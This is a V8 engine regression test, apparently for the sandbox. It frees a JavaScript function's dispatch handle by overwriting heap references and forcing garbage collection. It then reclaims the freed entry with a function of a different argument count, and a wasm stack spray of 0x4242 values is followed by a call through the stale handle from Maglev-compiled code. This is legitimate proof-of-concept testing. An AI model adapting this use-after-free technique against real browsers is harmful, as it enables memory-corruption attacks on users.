// Copyright 2025 the V8 project authors. All rights reserved.
// Use of this source code is governed by a BSD-style license that can be
// found in the LICENSE file.

// Flags: --allow-natives-syntax --expose-gc --sandbox-testing

const kHeapObjectTag = 1;
const kDispatchHandleOffset = Sandbox.getFieldOffset(Sandbox.getInstanceTypeIdFor("JS_FUNCTION"), "dispatch_handle");

const memory = new DataView(new Sandbox.MemoryView(0, 0x100000000));
const nuke_handle_from_heap_and_hope_nothing_important_is_gone = (dispatch_handle) => {
  for (let i = 0x40000; i < 0xc0000; i += 4) {
    if (memory.getUint32(i, true) === dispatch_handle) memory.setUint32(i, 0, true);
  }
  for (let i = 0x100000; i < 0x140000; i += 4) {
    if (memory.getUint32(i, true) === dispatch_handle) memory.setUint32(i, 0, true);
  }
}

// From test/mjsunit/sandbox/regress-430960844.js.
let spray_mod = new WebAssembly.Module(new Uint8Array([
  0x00, 0x61, 0x73, 0x6d,  // wasm magic
  0x01, 0x00, 0x00, 0x00,  // wasm version

  0x01,                    // section kind: Type
  0x18,                    // section length 24
  0x02,                    // types count 2
  0x60,                    //  kind: func
  0x10,                    // param count 16
  0x7e, 0x7e, 0x7e, 0x7e,  // i64 i64 i64 i64
  0x7e, 0x7e, 0x7e, 0x7e,  // i64 i64 i64 i64
  0x7e, 0x7e, 0x7e, 0x7e,  // i64 i64 i64 i64
  0x7e, 0x7e, 0x7e, 0x7e,  // i64 i64 i64 i64
  0x00,                    // return count 0
  0x60,                    //  kind: func
  0x01, 0x7e,              // param count 1:  i64
  0x00,                    // return count 0

  0x02,                    // section kind: Import
  0x0f,                    // section length 15
  0x01, 0x02,              // imports count 1: module name length:  2
  0x6a, 0x73,              // module name: js
  0x08,                    // field name length:  8
  0x73, 0x70, 0x72, 0x61, 0x79, 0x5f, 0x63, 0x62,  // field name: spray_cb
  0x00, 0x00,              // kind or compact flag: function (param i64 i64 i64 i64 i64 i64 i64 i64 i64 i64 i64 i64 i64 i64 i64 i64)
                           // import #0

  0x03,                    // section kind: Function
  0x02,                    // section length 2
  0x01, 0x01,              // functions count 1: 1 $spray (param i64)

  0x07,                    // section kind: Export
  0x09,                    // section length 9
  0x01,                    // exports count 1: export # 0
  0x05,                    // field name length:  5
  0x73, 0x70, 0x72, 0x61, 0x79,  // field name: spray
  0x00, 0x01,              // kind: function index:  1

  0x0a,                    // section kind: Code
  0x26,                    // section length 38
  0x01,                    // functions count 1
                           // function #1 $spray
  0x24,                    // body size 36
  0x00,                    // 0 entries in locals list
  0x20, 0x00,              // local.get $var0
  0x20, 0x00,              // local.get $var0
  0x20, 0x00,              // local.get $var0
  0x20, 0x00,              // local.get $var0
  0x20, 0x00,              // local.get $var0
  0x20, 0x00,              // local.get $var0
  0x20, 0x00,              // local.get $var0
  0x20, 0x00,              // local.get $var0
  0x20, 0x00,              // local.get $var0
  0x20, 0x00,              // local.get $var0
  0x20, 0x00,              // local.get $var0
  0x20, 0x00,              // local.get $var0
  0x20, 0x00,              // local.get $var0
  0x20, 0x00,              // local.get $var0
  0x20, 0x00,              // local.get $var0
  0x20, 0x00,              // local.get $var0
  0x10, 0x00,              // call $js.spray_cb
  0x0b,                    // end
]));
let { spray } = new WebAssembly.Instance(spray_mod, { js: { spray_cb: () => { } } }).exports;

// Get a clean slate.
gc({type: "major"});

// This thing's dispatch handle will be uaf'd.
const victim = eval("() => {}");

const maglev = () => {
  // Victim below will be called using its dispatch handle which at the time of
  // Maglev compilation will take no args per its dispatch entry.
  victim();
  spray(0x424242424242n);
};
%PrepareFunctionForOptimization(maglev);
maglev();
%OptimizeMaglevOnNextCall(maglev);
maglev();

// Remove all heap references to victim and trigger gc to free the handle.
const dispatch_handle = memory.getUint32(Sandbox.getAddressOf(victim) + kDispatchHandleOffset, true);
nuke_handle_from_heap_and_hope_nothing_important_is_gone(dispatch_handle);
gc({type: "major"});

// Reclaim the victim dispatch entry with a different arg count.
const victim_alias = eval("(a0,a1,a2,a3,a4,a5,a6,a7,a8,a9,a10,a11,a12,a13,a14) => {}");
%PrepareFunctionForOptimization(victim_alias);
victim_alias();
%OptimizeFunctionOnNextCall(victim_alias);
victim_alias();
spray(0x424242424242n);
maglev();
